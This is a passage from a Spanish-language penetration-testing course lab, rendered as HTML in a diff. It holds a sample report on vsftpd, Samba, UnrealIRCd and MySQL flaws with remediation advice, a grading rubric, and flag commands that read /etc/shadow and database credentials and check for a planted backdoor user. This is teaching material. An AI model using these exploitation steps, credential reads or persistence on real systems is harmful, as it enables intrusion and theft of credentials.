+<span id="cb43-730"><a href="#cb43-730" aria-hidden="true" tabindex="-1"></a>uid=0(root) gid=0(root) groups=0(root)</span>
+<span id="cb43-731"><a href="#cb43-731" aria-hidden="true" tabindex="-1"></a><span class="in">```</span></span>
+<span id="cb43-732"><a href="#cb43-732" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-733"><a href="#cb43-733" aria-hidden="true" tabindex="-1"></a><span class="in">**Remediación**:</span></span>
+<span id="cb43-734"><a href="#cb43-734" aria-hidden="true" tabindex="-1"></a><span class="in">- Actualizar vsftpd a versión 2.3.5 o superior (parcheada)</span></span>
+<span id="cb43-735"><a href="#cb43-735" aria-hidden="true" tabindex="-1"></a><span class="in">- Verificar integridad del binario con checksums</span></span>
+<span id="cb43-736"><a href="#cb43-736" aria-hidden="true" tabindex="-1"></a><span class="in">- Considerar reemplazar por OpenSSH o ProFTPD</span></span>
+<span id="cb43-737"><a href="#cb43-737" aria-hidden="true" tabindex="-1"></a><span class="in">- Deshabilitar FTP si no es necesario, usar SFTP</span></span>
+<span id="cb43-738"><a href="#cb43-738" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-739"><a href="#cb43-739" aria-hidden="true" tabindex="-1"></a><span class="in">---</span></span>
+<span id="cb43-740"><a href="#cb43-740" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-741"><a href="#cb43-741" aria-hidden="true" tabindex="-1"></a><span class="in">### Finding 2 — Samba 3.0.20 Username Map Script RCE</span></span>
+<span id="cb43-742"><a href="#cb43-742" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-743"><a href="#cb43-743" aria-hidden="true" tabindex="-1"></a><span class="in">| Campo        | Detalle                                     |</span></span>
+<span id="cb43-744"><a href="#cb43-744" aria-hidden="true" tabindex="-1"></a><span class="in">|--------------|---------------------------------------------|</span></span>
+<span id="cb43-745"><a href="#cb43-745" aria-hidden="true" tabindex="-1"></a><span class="in">| **CVE**      | CVE-2007-2447                               |</span></span>
+<span id="cb43-746"><a href="#cb43-746" aria-hidden="true" tabindex="-1"></a><span class="in">| **CVSS v2**  | 10.0 (Crítico)                              |</span></span>
+<span id="cb43-747"><a href="#cb43-747" aria-hidden="true" tabindex="-1"></a><span class="in">| **Puerto**   | 139,445/tcp (SMB)                           |</span></span>
+<span id="cb43-748"><a href="#cb43-748" aria-hidden="true" tabindex="-1"></a><span class="in">| **Servicio** | Samba 3.0.20-Debian                         |</span></span>
+<span id="cb43-749"><a href="#cb43-749" aria-hidden="true" tabindex="-1"></a><span class="in">| **Impacto**  | Ejecución remota de código como root        |</span></span>
+<span id="cb43-750"><a href="#cb43-750" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-751"><a href="#cb43-751" aria-hidden="true" tabindex="-1"></a><span class="in">**Descripción**: Samba versiones 3.0.0 a 3.0.25rc3 permiten inyección </span></span>
+<span id="cb43-752"><a href="#cb43-752" aria-hidden="true" tabindex="-1"></a><span class="in">de comandos mediante el parámetro `username map script` en configuración </span></span>
+<span id="cb43-753"><a href="#cb43-753" aria-hidden="true" tabindex="-1"></a><span class="in">MS-RPC. Sin autenticación, permite obtener shell root directamente.</span></span>
+<span id="cb43-754"><a href="#cb43-754" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-755"><a href="#cb43-755" aria-hidden="true" tabindex="-1"></a><span class="in">**Pasos de reproducción**:</span></span>
+<span id="cb43-756"><a href="#cb43-756" aria-hidden="true" tabindex="-1"></a><span class="in">1. Usar MSF módulo `exploit/multi/samba/usermap_script`</span></span>
+<span id="cb43-757"><a href="#cb43-757" aria-hidden="true" tabindex="-1"></a><span class="in">2. Configurar RHOSTS y LHOST</span></span>
+<span id="cb43-758"><a href="#cb43-758" aria-hidden="true" tabindex="-1"></a><span class="in">3. Ejecutar exploit para obtener reverse shell root</span></span>
+<span id="cb43-759"><a href="#cb43-759" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-760"><a href="#cb43-760" aria-hidden="true" tabindex="-1"></a><span class="in">**Remediación**:</span></span>
+<span id="cb43-761"><a href="#cb43-761" aria-hidden="true" tabindex="-1"></a><span class="in">- Actualizar Samba a 3.0.25 o superior</span></span>
+<span id="cb43-762"><a href="#cb43-762" aria-hidden="true" tabindex="-1"></a><span class="in">- Deshabilitar SMBv1</span></span>
+<span id="cb43-763"><a href="#cb43-763" aria-hidden="true" tabindex="-1"></a><span class="in">- Aplicar firewall para restringir acceso a puertos 139/445</span></span>
+<span id="cb43-764"><a href="#cb43-764" aria-hidden="true" tabindex="-1"></a><span class="in">- Revisar configuración de `smb.conf`</span></span>
+<span id="cb43-765"><a href="#cb43-765" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-766"><a href="#cb43-766" aria-hidden="true" tabindex="-1"></a><span class="in">---</span></span>
+<span id="cb43-767"><a href="#cb43-767" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-768"><a href="#cb43-768" aria-hidden="true" tabindex="-1"></a><span class="in">### Finding 3 — UnrealIRCd 3.2.8.1 Backdoor</span></span>
+<span id="cb43-769"><a href="#cb43-769" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-770"><a href="#cb43-770" aria-hidden="true" tabindex="-1"></a><span class="in">| Campo        | Detalle                                     |</span></span>
+<span id="cb43-771"><a href="#cb43-771" aria-hidden="true" tabindex="-1"></a><span class="in">|--------------|---------------------------------------------|</span></span>
+<span id="cb43-772"><a href="#cb43-772" aria-hidden="true" tabindex="-1"></a><span class="in">| **CVE**      | CVE-2010-2075                               |</span></span>
+<span id="cb43-773"><a href="#cb43-773" aria-hidden="true" tabindex="-1"></a><span class="in">| **CVSS v2**  | 7.5 (Alta)                                  |</span></span>
+<span id="cb43-774"><a href="#cb43-774" aria-hidden="true" tabindex="-1"></a><span class="in">| **Puerto**   | 6667/tcp (IRC)                              |</span></span>
+<span id="cb43-775"><a href="#cb43-775" aria-hidden="true" tabindex="-1"></a><span class="in">| **Servicio** | UnrealIRCd 3.2.8.1                          |</span></span>
+<span id="cb43-776"><a href="#cb43-776" aria-hidden="true" tabindex="-1"></a><span class="in">| **Impacto**  | Ejecución remota de código como ircd        |</span></span>
+<span id="cb43-777"><a href="#cb43-777" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-778"><a href="#cb43-778" aria-hidden="true" tabindex="-1"></a><span class="in">**Descripción**: Distribución oficial de UnrealIRCd 3.2.8.1 fue </span></span>
+<span id="cb43-779"><a href="#cb43-779" aria-hidden="true" tabindex="-1"></a><span class="in">comprometida con backdoor que ejecuta comandos arbitrarios al recibir </span></span>
+<span id="cb43-780"><a href="#cb43-780" aria-hidden="true" tabindex="-1"></a><span class="in">los caracteres `AB` en la conexión IRC.</span></span>
+<span id="cb43-781"><a href="#cb43-781" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-782"><a href="#cb43-782" aria-hidden="true" tabindex="-1"></a><span class="in">**Remediación**:</span></span>
+<span id="cb43-783"><a href="#cb43-783" aria-hidden="true" tabindex="-1"></a><span class="in">- Actualizar a UnrealIRCd 3.2.9 o superior</span></span>
+<span id="cb43-784"><a href="#cb43-784" aria-hidden="true" tabindex="-1"></a><span class="in">- Verificar checksums SHA256 de todos los binarios críticos</span></span>
+<span id="cb43-785"><a href="#cb43-785" aria-hidden="true" tabindex="-1"></a><span class="in">- Deshabilitar IRC si no es servicio esencial</span></span>
+<span id="cb43-786"><a href="#cb43-786" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-787"><a href="#cb43-787" aria-hidden="true" tabindex="-1"></a><span class="in">---</span></span>
+<span id="cb43-788"><a href="#cb43-788" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-789"><a href="#cb43-789" aria-hidden="true" tabindex="-1"></a><span class="in">### Finding 4 — MySQL Credenciales por Defecto</span></span>
+<span id="cb43-790"><a href="#cb43-790" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-791"><a href="#cb43-791" aria-hidden="true" tabindex="-1"></a><span class="in">| Campo        | Detalle                                     |</span></span>
+<span id="cb43-792"><a href="#cb43-792" aria-hidden="true" tabindex="-1"></a><span class="in">|--------------|---------------------------------------------|</span></span>
+<span id="cb43-793"><a href="#cb43-793" aria-hidden="true" tabindex="-1"></a><span class="in">| **CVE**      | N/A (configuración incorrecta)              |</span></span>
+<span id="cb43-794"><a href="#cb43-794" aria-hidden="true" tabindex="-1"></a><span class="in">| **CVSS v3**  | 9.8 (Crítico)                               |</span></span>
+<span id="cb43-795"><a href="#cb43-795" aria-hidden="true" tabindex="-1"></a><span class="in">| **Puerto**   | 3306/tcp (MySQL)                            |</span></span>
+<span id="cb43-796"><a href="#cb43-796" aria-hidden="true" tabindex="-1"></a><span class="in">| **Servicio** | MySQL 5.0.51a                               |</span></span>
+<span id="cb43-797"><a href="#cb43-797" aria-hidden="true" tabindex="-1"></a><span class="in">| **Impacto**  | Acceso completo a todas las bases de datos  |</span></span>
+<span id="cb43-798"><a href="#cb43-798" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-799"><a href="#cb43-799" aria-hidden="true" tabindex="-1"></a><span class="in">**Descripción**: MySQL acepta conexiones remotas con usuario `root` </span></span>
+<span id="cb43-800"><a href="#cb43-800" aria-hidden="true" tabindex="-1"></a><span class="in">y contraseña vacía. Permite acceso a todas las bases de datos, </span></span>
+<span id="cb43-801"><a href="#cb43-801" aria-hidden="true" tabindex="-1"></a><span class="in">incluyendo datos de aplicaciones DVWA, tikiwiki y metasploit.</span></span>
+<span id="cb43-802"><a href="#cb43-802" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-803"><a href="#cb43-803" aria-hidden="true" tabindex="-1"></a><span class="in">**Remediación**:</span></span>
+<span id="cb43-804"><a href="#cb43-804" aria-hidden="true" tabindex="-1"></a><span class="in">- Establecer contraseña fuerte para root de MySQL</span></span>
+<span id="cb43-805"><a href="#cb43-805" aria-hidden="true" tabindex="-1"></a><span class="in">- Deshabilitar acceso remoto de root (bind solo a localhost)</span></span>
+<span id="cb43-806"><a href="#cb43-806" aria-hidden="true" tabindex="-1"></a><span class="in">- Implementar principio de mínimo privilegio por base de datos</span></span>
+<span id="cb43-807"><a href="#cb43-807" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-808"><a href="#cb43-808" aria-hidden="true" tabindex="-1"></a><span class="in">---</span></span>
+<span id="cb43-809"><a href="#cb43-809" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-810"><a href="#cb43-810" aria-hidden="true" tabindex="-1"></a><span class="in">## 3. Matriz de Riesgo</span></span>
+<span id="cb43-811"><a href="#cb43-811" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-812"><a href="#cb43-812" aria-hidden="true" tabindex="-1"></a><span class="in">| ID | Hallazgo                    | Criticidad | Probabilidad | Impacto | Prioridad |</span></span>
+<span id="cb43-813"><a href="#cb43-813" aria-hidden="true" tabindex="-1"></a><span class="in">|----|-----------------------------|-----------:|:------------:|:-------:|:---------:|</span></span>
+<span id="cb43-814"><a href="#cb43-814" aria-hidden="true" tabindex="-1"></a><span class="in">| F1 | vsftpd Backdoor             | Crítico    | Alta         | Total   | INMEDIATA |</span></span>
+<span id="cb43-815"><a href="#cb43-815" aria-hidden="true" tabindex="-1"></a><span class="in">| F2 | Samba RCE                   | Crítico    | Alta         | Total   | INMEDIATA |</span></span>
+<span id="cb43-816"><a href="#cb43-816" aria-hidden="true" tabindex="-1"></a><span class="in">| F3 | UnrealIRCd Backdoor         | Alta       | Alta         | Alto    | URGENTE   |</span></span>
+<span id="cb43-817"><a href="#cb43-817" aria-hidden="true" tabindex="-1"></a><span class="in">| F4 | MySQL sin contraseña        | Crítico    | Alta         | Total   | INMEDIATA |</span></span>
+<span id="cb43-818"><a href="#cb43-818" aria-hidden="true" tabindex="-1"></a><span class="in">| F5 | SQLi en DVWA                | Alto       | Alta         | Alto    | URGENTE   |</span></span>
+<span id="cb43-819"><a href="#cb43-819" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-820"><a href="#cb43-820" aria-hidden="true" tabindex="-1"></a><span class="in">---</span></span>
+<span id="cb43-821"><a href="#cb43-821" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-822"><a href="#cb43-822" aria-hidden="true" tabindex="-1"></a><span class="in">## 4. Recomendaciones Generales</span></span>
+<span id="cb43-823"><a href="#cb43-823" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-824"><a href="#cb43-824" aria-hidden="true" tabindex="-1"></a><span class="in">1. **Actualización inmediata**: Parchear todos los servicios a versiones actuales</span></span>
+<span id="cb43-825"><a href="#cb43-825" aria-hidden="true" tabindex="-1"></a><span class="in">2. **Segmentación de red**: Aislar servicios sensibles en VLANs separadas</span></span>
+<span id="cb43-826"><a href="#cb43-826" aria-hidden="true" tabindex="-1"></a><span class="in">3. **Firewall**: Implementar reglas que permitan solo tráfico necesario</span></span>
+<span id="cb43-827"><a href="#cb43-827" aria-hidden="true" tabindex="-1"></a><span class="in">4. **Principio de mínimo privilegio**: Servicios no deben correr como root</span></span>
+<span id="cb43-828"><a href="#cb43-828" aria-hidden="true" tabindex="-1"></a><span class="in">5. **Monitoreo**: Implementar IDS/IPS y SIEM para detección de ataques</span></span>
+<span id="cb43-829"><a href="#cb43-829" aria-hidden="true" tabindex="-1"></a><span class="in">6. **Revisión de configuración**: Auditar todas las aplicaciones web instaladas</span></span>
+<span id="cb43-830"><a href="#cb43-830" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-831"><a href="#cb43-831" aria-hidden="true" tabindex="-1"></a><span class="in">---</span></span>
+<span id="cb43-832"><a href="#cb43-832" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-833"><a href="#cb43-833" aria-hidden="true" tabindex="-1"></a><span class="in">## 5. Anexos</span></span>
+<span id="cb43-834"><a href="#cb43-834" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-835"><a href="#cb43-835" aria-hidden="true" tabindex="-1"></a><span class="in">### Anexo A — Herramientas Utilizadas</span></span>
+<span id="cb43-836"><a href="#cb43-836" aria-hidden="true" tabindex="-1"></a><span class="in">| Herramienta   | Versión | Propósito                            |</span></span>
+<span id="cb43-837"><a href="#cb43-837" aria-hidden="true" tabindex="-1"></a><span class="in">|---------------|---------|--------------------------------------|</span></span>
+<span id="cb43-838"><a href="#cb43-838" aria-hidden="true" tabindex="-1"></a><span class="in">| Kali Linux    | 2024.x  | Sistema operativo atacante           |</span></span>
+<span id="cb43-839"><a href="#cb43-839" aria-hidden="true" tabindex="-1"></a><span class="in">| nmap          | 7.94    | Escaneo de puertos y servicios       |</span></span>
+<span id="cb43-840"><a href="#cb43-840" aria-hidden="true" tabindex="-1"></a><span class="in">| Metasploit    | 6.x     | Framework de explotación             |</span></span>
+<span id="cb43-841"><a href="#cb43-841" aria-hidden="true" tabindex="-1"></a><span class="in">| enum4linux    | 0.9.1   | Enumeración SMB/Samba                |</span></span>
+<span id="cb43-842"><a href="#cb43-842" aria-hidden="true" tabindex="-1"></a><span class="in">| nikto         | 2.1.6   | Escáner web                          |</span></span>
+<span id="cb43-843"><a href="#cb43-843" aria-hidden="true" tabindex="-1"></a><span class="in">| sqlmap        | 1.7.x   | Explotación de SQL Injection         |</span></span>
+<span id="cb43-844"><a href="#cb43-844" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-845"><a href="#cb43-845" aria-hidden="true" tabindex="-1"></a><span class="in">### Anexo B — Cronología del Ataque</span></span>
+<span id="cb43-846"><a href="#cb43-846" aria-hidden="true" tabindex="-1"></a><span class="in">| Hora  | Acción                           |</span></span>
+<span id="cb43-847"><a href="#cb43-847" aria-hidden="true" tabindex="-1"></a><span class="in">|-------|----------------------------------|</span></span>
+<span id="cb43-848"><a href="#cb43-848" aria-hidden="true" tabindex="-1"></a><span class="in">| 09:00 | Inicio de reconocimiento         |</span></span>
+<span id="cb43-849"><a href="#cb43-849" aria-hidden="true" tabindex="-1"></a><span class="in">| 09:30 | Identificación de servicios      |</span></span>
+<span id="cb43-850"><a href="#cb43-850" aria-hidden="true" tabindex="-1"></a><span class="in">| 10:00 | Enumeración SMB y web            |</span></span>
+<span id="cb43-851"><a href="#cb43-851" aria-hidden="true" tabindex="-1"></a><span class="in">| 10:45 | Explotación vsftpd (Vector 1)    |</span></span>
+<span id="cb43-852"><a href="#cb43-852" aria-hidden="true" tabindex="-1"></a><span class="in">| 11:15 | Explotación Samba (Vector 2)     |</span></span>
+<span id="cb43-853"><a href="#cb43-853" aria-hidden="true" tabindex="-1"></a><span class="in">| 11:45 | Explotación IRC (Vector 3)       |</span></span>
+<span id="cb43-854"><a href="#cb43-854" aria-hidden="true" tabindex="-1"></a><span class="in">| 12:30 | Post-explotación y persistencia  |</span></span>
+<span id="cb43-855"><a href="#cb43-855" aria-hidden="true" tabindex="-1"></a><span class="in">| 13:30 | Documentación y reporte          |</span></span>
+<span id="cb43-856"><a href="#cb43-856" aria-hidden="true" tabindex="-1"></a><span class="in">```</span></span>
+<span id="cb43-857"><a href="#cb43-857" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-858"><a href="#cb43-858" aria-hidden="true" tabindex="-1"></a>---</span>
+<span id="cb43-859"><a href="#cb43-859" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-860"><a href="#cb43-860" aria-hidden="true" tabindex="-1"></a><span class="fu">## Resultado Esperado</span></span>
+<span id="cb43-861"><a href="#cb43-861" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-862"><a href="#cb43-862" aria-hidden="true" tabindex="-1"></a>Al completar el lab, el estudiante debe haber obtenido y documentado:</span>
+<span id="cb43-863"><a href="#cb43-863" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-864"><a href="#cb43-864" aria-hidden="true" tabindex="-1"></a><span class="ss">1. </span>**Shell root** en al menos dos vectores diferentes</span>
+<span id="cb43-865"><a href="#cb43-865" aria-hidden="true" tabindex="-1"></a><span class="ss">2. </span>**Archivo `/etc/shadow`** descargado (con hash de passwords)</span>
+<span id="cb43-866"><a href="#cb43-866" aria-hidden="true" tabindex="-1"></a><span class="ss">3. </span>**Credenciales de base de datos** extraídas desde archivos de configuración</span>
+<span id="cb43-867"><a href="#cb43-867" aria-hidden="true" tabindex="-1"></a><span class="ss">4. </span>**Usuario persistente** creado en el sistema objetivo</span>
+<span id="cb43-868"><a href="#cb43-868" aria-hidden="true" tabindex="-1"></a><span class="ss">5. </span>**Reporte técnico** con al menos 3 findings documentados con CVE y CVSS</span>
+<span id="cb43-869"><a href="#cb43-869" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-870"><a href="#cb43-870" aria-hidden="true" tabindex="-1"></a><span class="fu">### Flags para Capturar (Evidencia)</span></span>
+<span id="cb43-871"><a href="#cb43-871" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-872"><a href="#cb43-872" aria-hidden="true" tabindex="-1"></a><span class="in">```bash</span></span>
+<span id="cb43-873"><a href="#cb43-873" aria-hidden="true" tabindex="-1"></a><span class="co"># Flag 1 — contenido de /etc/shadow (primeras 3 líneas)</span></span>
+<span id="cb43-874"><a href="#cb43-874" aria-hidden="true" tabindex="-1"></a><span class="fu">head</span> <span class="at">-3</span> /etc/shadow</span>
+<span id="cb43-875"><a href="#cb43-875" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-876"><a href="#cb43-876" aria-hidden="true" tabindex="-1"></a><span class="co"># Flag 2 — ID del proceso de Metasploit activo</span></span>
+<span id="cb43-877"><a href="#cb43-877" aria-hidden="true" tabindex="-1"></a><span class="ex">pgrep</span> <span class="at">-a</span> postgres</span>
+<span id="cb43-878"><a href="#cb43-878" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-879"><a href="#cb43-879" aria-hidden="true" tabindex="-1"></a><span class="co"># Flag 3 — contenido del archivo de configuración de DVWA</span></span>
+<span id="cb43-880"><a href="#cb43-880" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> /var/www/dvwa/config/config.inc.php <span class="kw">|</span> <span class="fu">grep</span> db_</span>
+<span id="cb43-881"><a href="#cb43-881" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-882"><a href="#cb43-882" aria-hidden="true" tabindex="-1"></a><span class="co"># Flag 4 — usuario backdoor creado</span></span>
+<span id="cb43-883"><a href="#cb43-883" aria-hidden="true" tabindex="-1"></a><span class="fu">grep</span> backd00r /etc/passwd</span>
+<span id="cb43-884"><a href="#cb43-884" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-885"><a href="#cb43-885" aria-hidden="true" tabindex="-1"></a><span class="co"># Flag 5 — versión exacta del kernel</span></span>
+<span id="cb43-886"><a href="#cb43-886" aria-hidden="true" tabindex="-1"></a><span class="fu">uname</span> <span class="at">-r</span></span>
+<span id="cb43-887"><a href="#cb43-887" aria-hidden="true" tabindex="-1"></a><span class="in">```</span></span>
+<span id="cb43-888"><a href="#cb43-888" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-889"><a href="#cb43-889" aria-hidden="true" tabindex="-1"></a><span class="fu">### Capturas de Pantalla Requeridas</span></span>
+<span id="cb43-890"><a href="#cb43-890" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-891"><a href="#cb43-891" aria-hidden="true" tabindex="-1"></a><span class="ss">- </span><span class="va">[ ]</span> <span class="in">`screenshot_01_nmap_puertos.png`</span> — Output completo de nmap con todos los puertos</span>
+<span id="cb43-892"><a href="#cb43-892" aria-hidden="true" tabindex="-1"></a><span class="ss">- </span><span class="va">[ ]</span> <span class="in">`screenshot_02_vector1_root.png`</span> — Shell root vía vsftpd</span>
+<span id="cb43-893"><a href="#cb43-893" aria-hidden="true" tabindex="-1"></a><span class="ss">- </span><span class="va">[ ]</span> <span class="in">`screenshot_03_vector2_samba.png`</span> — Shell root vía Samba</span>
+<span id="cb43-894"><a href="#cb43-894" aria-hidden="true" tabindex="-1"></a><span class="ss">- </span><span class="va">[ ]</span> <span class="in">`screenshot_04_vector3_irc.png`</span> — Shell vía UnrealIRCd</span>
+<span id="cb43-895"><a href="#cb43-895" aria-hidden="true" tabindex="-1"></a><span class="ss">- </span><span class="va">[ ]</span> <span class="in">`screenshot_05_shadow.png`</span> — Contenido de /etc/shadow exfiltrado</span>
+<span id="cb43-896"><a href="#cb43-896" aria-hidden="true" tabindex="-1"></a><span class="ss">- </span><span class="va">[ ]</span> <span class="in">`screenshot_06_persistencia.png`</span> — Usuario backdoor en /etc/passwd</span>
+<span id="cb43-897"><a href="#cb43-897" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-898"><a href="#cb43-898" aria-hidden="true" tabindex="-1"></a>---</span>
+<span id="cb43-899"><a href="#cb43-899" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-900"><a href="#cb43-900" aria-hidden="true" tabindex="-1"></a><span class="fu">## Rúbrica de Evaluación</span></span>
+<span id="cb43-901"><a href="#cb43-901" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-902"><a href="#cb43-902" aria-hidden="true" tabindex="-1"></a><span class="pp">|</span> Componente                        <span class="pp">|</span> Peso <span class="pp">|</span> Criterios de Evaluación                                                                                                  <span class="pp">|</span></span>
+<span id="cb43-903"><a href="#cb43-903" aria-hidden="true" tabindex="-1"></a><span class="pp">|-----------------------------------|-----:|--------------------------------------------------------------------------------------------------------------------------|</span></span>
+<span id="cb43-904"><a href="#cb43-904" aria-hidden="true" tabindex="-1"></a><span class="pp">|</span> **Laboratorio — Evidencia**       <span class="pp">|</span>  40% <span class="pp">|</span> Capturas de pantalla de cada vector explotado, archivos de log de msfconsole, flags capturados, usuario persistente documentado <span class="pp">|</span></span>
+<span id="cb43-905"><a href="#cb43-905" aria-hidden="true" tabindex="-1"></a><span class="pp">|</span> **Reporte Escrito**               <span class="pp">|</span>  40% <span class="pp">|</span> Hallazgos con CVE y CVSS, pasos de reproducción claros, evidencias adjuntas, recomendaciones de remediación específicas  <span class="pp">|</span></span>
+<span id="cb43-906"><a href="#cb43-906" aria-hidden="true" tabindex="-1"></a><span class="pp">|</span> **Examen Teórico (Quiz U8)**      <span class="pp">|</span>  20% <span class="pp">|</span> Preguntas sobre CVEs explotados, metodología PTES, diferencia entre escalada horizontal/vertical, conceptos de persistencia <span class="pp">|</span></span>
+<span id="cb43-907"><a href="#cb43-907" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-908"><a href="#cb43-908" aria-hidden="true" tabindex="-1"></a><span class="fu">### Desglose del Laboratorio (40%)</span></span>
+<span id="cb43-909"><a href="#cb43-909" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-910"><a href="#cb43-910" aria-hidden="true" tabindex="-1"></a><span class="pp">|</span> Sub-criterio                       <span class="pp">|</span> Puntos <span class="pp">|</span></span>
+<span id="cb43-911"><a href="#cb43-911" aria-hidden="true" tabindex="-1"></a><span class="pp">|------------------------------------|-------:|</span></span>
+<span id="cb43-912"><a href="#cb43-912" aria-hidden="true" tabindex="-1"></a><span class="pp">|</span> Reconocimiento completo (nmap + enum4linux) <span class="pp">|</span> 10 <span class="pp">|</span></span>
+<span id="cb43-913"><a href="#cb43-913" aria-hidden="true" tabindex="-1"></a><span class="pp">|</span> Explotación Vector 1 (vsftpd)      <span class="pp">|</span> 20     <span class="pp">|</span></span>
+<span id="cb43-914"><a href="#cb43-914" aria-hidden="true" tabindex="-1"></a><span class="pp">|</span> Explotación Vector 2 (Samba o IRC) <span class="pp">|</span> 20     <span class="pp">|</span></span>
+<span id="cb43-915"><a href="#cb43-915" aria-hidden="true" tabindex="-1"></a><span class="pp">|</span> Explotación Vector 3 (web/SQLi)    <span class="pp">|</span> 15     <span class="pp">|</span></span>
+<span id="cb43-916"><a href="#cb43-916" aria-hidden="true" tabindex="-1"></a><span class="pp">|</span> Post-explotación documentada       <span class="pp">|</span> 20     <span class="pp">|</span></span>
+<span id="cb43-917"><a href="#cb43-917" aria-hidden="true" tabindex="-1"></a><span class="pp">|</span> Persistencia implementada          <span class="pp">|</span> 15     <span class="pp">|</span></span>
+<span id="cb43-918"><a href="#cb43-918" aria-hidden="true" tabindex="-1"></a><span class="pp">|</span> **Total**                          | **100** <span class="pp">|</span></span>
+<span id="cb43-919"><a href="#cb43-919" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-920"><a href="#cb43-920" aria-hidden="true" tabindex="-1"></a><span class="fu">### Desglose del Reporte (40%)</span></span>
+<span id="cb43-921"><a href="#cb43-921" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-922"><a href="#cb43-922" aria-hidden="true" tabindex="-1"></a><span class="pp">|</span> Sub-criterio                         <span class="pp">|</span> Puntos <span class="pp">|</span></span>
+<span id="cb43-923"><a href="#cb43-923" aria-hidden="true" tabindex="-1"></a><span class="pp">|--------------------------------------|-------:|</span></span>
+<span id="cb43-924"><a href="#cb43-924" aria-hidden="true" tabindex="-1"></a><span class="pp">|</span> Resumen ejecutivo claro              <span class="pp">|</span> 15     <span class="pp">|</span></span>
+<span id="cb43-925"><a href="#cb43-925" aria-hidden="true" tabindex="-1"></a><span class="pp">|</span> Findings con CVE, CVSS y descripción <span class="pp">|</span> 30     <span class="pp">|</span></span>
+<span id="cb43-926"><a href="#cb43-926" aria-hidden="true" tabindex="-1"></a><span class="pp">|</span> Pasos de reproducción verificables   <span class="pp">|</span> 25     <span class="pp">|</span></span>
+<span id="cb43-927"><a href="#cb43-927" aria-hidden="true" tabindex="-1"></a><span class="pp">|</span> Recomendaciones de remediación       <span class="pp">|</span> 20     <span class="pp">|</span></span>
+<span id="cb43-928"><a href="#cb43-928" aria-hidden="true" tabindex="-1"></a><span class="pp">|</span> Presentación profesional             <span class="pp">|</span> 10     <span class="pp">|</span></span>
+<span id="cb43-929"><a href="#cb43-929" aria-hidden="true" tabindex="-1"></a><span class="pp">|</span> **Total**                            | **100** <span class="pp">|</span></span>
+<span id="cb43-930"><a href="#cb43-930" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-931"><a href="#cb43-931" aria-hidden="true" tabindex="-1"></a>---</span>
+<span id="cb43-932"><a href="#cb43-932" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-933"><a href="#cb43-933" aria-hidden="true" tabindex="-1"></a><span class="fu">## Estructura de Entregables</span></span>
+<span id="cb43-934"><a href="#cb43-934" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-935"><a href="#cb43-935" aria-hidden="true" tabindex="-1"></a>Crear la carpeta <span class="in">`proyecto_final/`</span> con la siguiente estructura:</span>
+<span id="cb43-936"><a href="#cb43-936" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-937"><a href="#cb43-937" aria-hidden="true" tabindex="-1"></a><span class="in">```</span></span>
+<span id="cb43-938"><a href="#cb43-938" aria-hidden="true" tabindex="-1"></a><span class="in">proyecto_final/</span></span>
+<span id="cb43-939"><a href="#cb43-939" aria-hidden="true" tabindex="-1"></a><span class="in">├── README.md               # Índice del proyecto</span></span>
+<span id="cb43-940"><a href="#cb43-940" aria-hidden="true" tabindex="-1"></a><span class="in">├── reconocimiento/</span></span>
+<span id="cb43-941"><a href="#cb43-941" aria-hidden="true" tabindex="-1"></a><span class="in">│   ├── fase1_puertos.txt</span></span>
+<span id="cb43-942"><a href="#cb43-942" aria-hidden="true" tabindex="-1"></a><span class="in">│   ├── fase1_servicios.txt</span></span>
+<span id="cb43-943"><a href="#cb43-943" aria-hidden="true" tabindex="-1"></a><span class="in">│   └── fase2_smb.txt</span></span>
